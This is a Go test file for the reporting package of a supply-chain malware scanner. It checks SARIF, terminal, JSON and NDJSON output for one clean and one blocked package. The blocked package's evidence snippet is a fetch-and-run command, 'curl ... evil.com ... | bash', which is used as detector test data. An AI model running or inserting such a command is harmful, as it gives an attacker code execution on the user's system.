package report

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/analyzer"
)

func sampleVerdicts() []*analyzer.Verdict {
	return []*analyzer.Verdict{
		{
			PackageName:     "clean-pkg",
			PackageVersion:  "1.0.0",
			PackagePath:     "/test/clean-pkg",
			RiskLevel:       analyzer.RiskBenign,
			Action:          analyzer.ActionPass,
			ConfidenceScore: 0.05,
			Evidence:        []analyzer.EvidenceItem{},
		},
		{
			PackageName:     "malicious-pkg",
			PackageVersion:  "0.2.1",
			PackagePath:     "/test/malicious-pkg",
			RiskLevel:       analyzer.RiskCritical,
			Action:          analyzer.ActionBlock,
			ConfidenceScore: 0.95,
			HadObfuscation:  true,
			Evidence: []analyzer.EvidenceItem{
				{
					RuleID:      "Suspicious_Piped_Shell",
					FilePath:    "package.json",
					Severity:    analyzer.RiskCritical,
					Category:    "dropper",
					Description: "Remote curl command piped directly to bash",
					Snippet:     "curl -sL https://evil.com/sh | bash",
				},
			},
		},
	}
}

func TestGenerateSARIF(t *testing.T) {
	verdicts := sampleVerdicts()
	sarif, err := GenerateSARIF(verdicts)
	if err != nil {
		t.Fatalf("GenerateSARIF failed: %v", err)
	}

	if sarif.Version != "2.1.0" {
		t.Errorf("expected version 2.1.0, got %s", sarif.Version)
	}
	if len(sarif.Runs) != 1 {
		t.Fatalf("expected 1 run, got %d", len(sarif.Runs))
	}

	run := sarif.Runs[0]
	if run.Tool.Driver.Name != "go-yara-supplychain" {
		t.Errorf("expected driver name go-yara-supplychain, got %s", run.Tool.Driver.Name)
	}

	if len(run.Results) != 1 {
		t.Fatalf("expected 1 result from malicious package, got %d", len(run.Results))
	}

	res := run.Results[0]
	if res.RuleID != "Suspicious_Piped_Shell" {
		t.Errorf("expected rule Suspicious_Piped_Shell, got %s", res.RuleID)
	}
	if res.Level != "error" {
		t.Errorf("expected level error for critical finding, got %s", res.Level)
	}
}

func TestWriteSARIFToFile(t *testing.T) {
	tmpDir := t.TempDir()
	outPath := filepath.Join(tmpDir, "report.sarif")

	verdicts := sampleVerdicts()
	if err := WriteSARIFToFile(outPath, verdicts); err != nil {
		t.Fatalf("WriteSARIFToFile failed: %v", err)
	}

	data, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("reading SARIF file: %v", err)
	}

	var parsed map[string]interface{}
	if err := json.Unmarshal(data, &parsed); err != nil {
		t.Fatalf("unmarshaling SARIF JSON: %v", err)
	}

	if parsed["version"] != "2.1.0" {
		t.Errorf("expected version 2.1.0, got %v", parsed["version"])
	}
}

func TestTerminalOutput(t *testing.T) {
	verdicts := sampleVerdicts()
	var buf bytes.Buffer
	if err := WriteTerminal(&buf, verdicts, true); err != nil {
		t.Fatalf("WriteTerminal failed: %v", err)
	}

	out := buf.String()
	if !bytes.Contains([]byte(out), []byte("clean-pkg")) {
		t.Errorf("expected clean-pkg in terminal output")
	}
	if !bytes.Contains([]byte(out), []byte("[CRITICAL - BLOCK]")) {
		t.Errorf("expected [CRITICAL - BLOCK] in terminal output")
	}
	if !bytes.Contains([]byte(out), []byte("curl -sL https://evil.com/sh | bash")) {
		t.Errorf("expected snippet in terminal output")
	}
}

func TestJSONAndNDJSON(t *testing.T) {
	verdicts := sampleVerdicts()

	var jsonBuf bytes.Buffer
	if err := WriteJSON(&jsonBuf, verdicts); err != nil {
		t.Fatalf("WriteJSON failed: %v", err)
	}

	var parsed []analyzer.Verdict
	if err := json.Unmarshal(jsonBuf.Bytes(), &parsed); err != nil {
		t.Fatalf("unmarshaling JSON: %v", err)
	}
	if len(parsed) != 2 {
		t.Fatalf("expected 2 parsed verdicts, got %d", len(parsed))
	}

	var ndjsonBuf bytes.Buffer
	if err := WriteNDJSON(&ndjsonBuf, verdicts); err != nil {
		t.Fatalf("WriteNDJSON failed: %v", err)
	}
	lines := bytes.Split(bytes.TrimSpace(ndjsonBuf.Bytes()), []byte("\n"))
	if len(lines) != 2 {
		t.Fatalf("expected 2 NDJSON lines, got %d", len(lines))
	}
}
